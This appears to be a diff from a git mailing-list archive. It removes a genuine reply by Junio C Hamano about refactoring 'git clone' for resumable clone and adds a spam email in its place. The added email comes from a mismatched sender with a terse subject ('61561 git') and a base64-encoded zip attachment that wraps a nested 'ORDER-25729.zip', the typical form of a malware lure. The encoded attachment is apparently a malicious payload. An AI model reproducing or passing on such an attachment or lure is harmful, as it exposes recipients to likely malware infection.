@@ -2,121 +2,112 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-5.6 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,
-	RP_MATCHES_RCVD shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=-2.2 required=3.0 tests=BAYES_40,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 418DE1F4F8
-	for <e@80x24.org>; Wed, 28 Sep 2016 18:26:24 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 1E64A1F4F8
+	for <e@80x24.org>; Wed, 28 Sep 2016 18:40:39 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1754233AbcI1S0V (ORCPT <rfc822;e@80x24.org>);
-        Wed, 28 Sep 2016 14:26:21 -0400
-Received: from pb-smtp1.pobox.com ([64.147.108.70]:62920 "EHLO
-        sasl.smtp.pobox.com" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
-        with ESMTP id S1754028AbcI1SWJ (ORCPT <rfc822;git@vger.kernel.org>);
-        Wed, 28 Sep 2016 14:22:09 -0400
-Received: from sasl.smtp.pobox.com (unknown [127.0.0.1])
-        by pb-smtp1.pobox.com (Postfix) with ESMTP id 822F3424CB;
-        Wed, 28 Sep 2016 14:22:07 -0400 (EDT)
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=pobox.com; h=from:to:cc
-        :subject:references:date:in-reply-to:message-id:mime-version
-        :content-type; s=sasl; bh=WIam0YZutsakx1cDDO84geNSgeQ=; b=iiER1T
-        DoIr30cNzQUMY59Ph/A/TsUbj2kEE0ppdHvgmGLvaulFIC/REE6lt0/KdR24O3rc
-        YMA+0TXqQeokNYademWVmvA2icry2wS2FgczywFzVrszmrJiOzYkxbxjtf0nglim
-        GK1vQHYLsbsKSGOqmm4AzOJrjbG9TY8y8GCsI=
-DomainKey-Signature: a=rsa-sha1; c=nofws; d=pobox.com; h=from:to:cc
-        :subject:references:date:in-reply-to:message-id:mime-version
-        :content-type; q=dns; s=sasl; b=p7Q8Ngle4Nl+F7Y65DifXIsvTA56U8Vo
-        v0jfJcvLYt6rMWmcFDnPUdfNen5UQNYJL30nivetO6qvAhC4/LDrOerie04skklH
-        IvEptF4qvSEsKGUywkWYohO8XuBSNJ6W3fea5L+flj6N8aBMhIdxrBXrCH4Cz5dQ
-        jgrjYml643k=
-Received: from pb-smtp1.nyi.icgroup.com (unknown [127.0.0.1])
-        by pb-smtp1.pobox.com (Postfix) with ESMTP id 798C2424C2;
-        Wed, 28 Sep 2016 14:22:07 -0400 (EDT)
-Received: from pobox.com (unknown [104.132.0.95])
-        (using TLSv1.2 with cipher DHE-RSA-AES128-SHA (128/128 bits))
-        (No client certificate requested)
-        by pb-smtp1.pobox.com (Postfix) with ESMTPSA id E260D424C0;
-        Wed, 28 Sep 2016 14:22:06 -0400 (EDT)
-From:   Junio C Hamano <gitster@pobox.com>
-To:     Eric Wong <e@80x24.org>
-Cc:     Kevin Wern <kevin.m.wern@gmail.com>, git@vger.kernel.org
-Subject: Re: [PATCH 00/11] Resumable clone
-References: <1473984742-12516-1-git-send-email-kevin.m.wern@gmail.com>
-        <20160927215143.GA32622@starla>
-        <xmqqshslkndk.fsf@gitster.mtv.corp.google.com>
-        <xmqqy42cj5g1.fsf@gitster.mtv.corp.google.com>
-Date:   Wed, 28 Sep 2016 11:22:04 -0700
-In-Reply-To: <xmqqy42cj5g1.fsf@gitster.mtv.corp.google.com> (Junio C. Hamano's
-        message of "Wed, 28 Sep 2016 10:32:30 -0700")
-Message-ID: <xmqqd1jnkhpv.fsf@gitster.mtv.corp.google.com>
-User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/24.3 (gnu/linux)
+        id S1754714AbcI1SkU (ORCPT <rfc822;e@80x24.org>);
+        Wed, 28 Sep 2016 14:40:20 -0400
+Received: from ppp91-79-28-64.pppoe.mtu-net.ru ([91.79.28.64]:44685 "HELO
+        mtu-net.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754710AbcI1SkS (ORCPT <rfc822;git@vger.kernel.org>);
+        Wed, 28 Sep 2016 14:40:18 -0400
+X-Greylist: delayed 599 seconds by postgrey-1.27 at vger.kernel.org; Wed, 28 Sep 2016 14:40:17 EDT
+Message-ID: <147508801271.17353.2603963715038423575@mtu-net.ru>
+From:   <ccelena.astafieva@ehess.fr>
+To:     <git@vger.kernel.org>
+Subject: 61561 git
+Date:   Wed, 28 Sep 2016 18:40:12 -0000
+Importance: High
 MIME-Version: 1.0
-Content-Type: text/plain
-X-Pobox-Relay-ID: 766F7E30-85A8-11E6-B530-C26412518317-77302942!pb-smtp1.pobox.com
+Content-Type: application/zip; name="EMAIL_0682862_git.zip"
+Content-Disposition: attachment
+Content-Transfer-Encoding: base64
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-Junio C Hamano <gitster@pobox.com> writes:
-
-> Junio C Hamano <gitster@pobox.com> writes:
->
-> What "git clone" should have been was:
->
->     * Parse command line arguments;
->
->     * Create a new repository and go into it; this step would
->       require us to have parsed the command line for --template,
->       <directory>, --separate-git-dir, etc.
->
->     * Talk to the remote and do get_remote_heads() aka ls-remote
->       output;
->
->     * Decide what fetch refspec to use, which alternate object store
->       to borrow from; this step would require us to have parsed the
->       command line for --reference, --mirror, --origin, etc;
->
->     --- we'll insert something new here ---
->
->     * Issue "git fetch" with the refspec determined above; this step
->       would require us to have parsed the command line for --depth, etc.
->
->     * Run "git checkout -b" to create an initial checkout; this step
->       would require us to have parsed the command line for --branch,
->       etc.
->
-> Even though the current code conceptually does the above, these
-> steps are not cleanly separated as such.  I think our update to gain
-> "resumable clone" feature on the client side need to start by
-> refactoring the current code, before learning "resumable clone", to
-> look like the above.
->
-> Once we do that, we can insert an extra step before the step that
-> runs "git fetch" to optionally [*1*] grab the extra piece of
-> information Kevin's "prime-clone" service produces [*2*], and store
-> it in the "new repository" somewhere [*3*].
->
-> And then, as you suggested, an updated "git fetch" can be taught to
-> notice the priming information left by the previous step, and use it
-> to attempt to download the pack until success, and to index that
-> pack to learn the tips that can be used as ".have" entries in the
-> request.  From the original server's point of view, this fetch
-> request would "want" the same set of objects, but would appear as
-> an incremental update.
-
-Thinking about this even more, it probably makes even more sense to
-move the new "learn prime info and store it in repository somewhere,
-so that later re-invocation of 'git fetch' can take advantage of it"
-step _into_ "git fetch".  That would allow "git fetch" in a freshly
-created empty repository take advantage of this feature for free.
-
-The step that "git clone" internally drives "git fetch" would not
-actually be done by spawning a separate process with run_command()
-because we would want to reuse the connection we already have with
-the server when "git clone" first talked to it to learn "ls-remote"
-equivalent (i.e. transport_get_remote_refs()).  I wonder if we can
-do without this early "ls-remote"; that would further simplify
-things by allowing us to just spawn "git fetch" internally.
-
+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
+AABQSwUGAAAAAAEAAQBVAAAARBEAAAAA
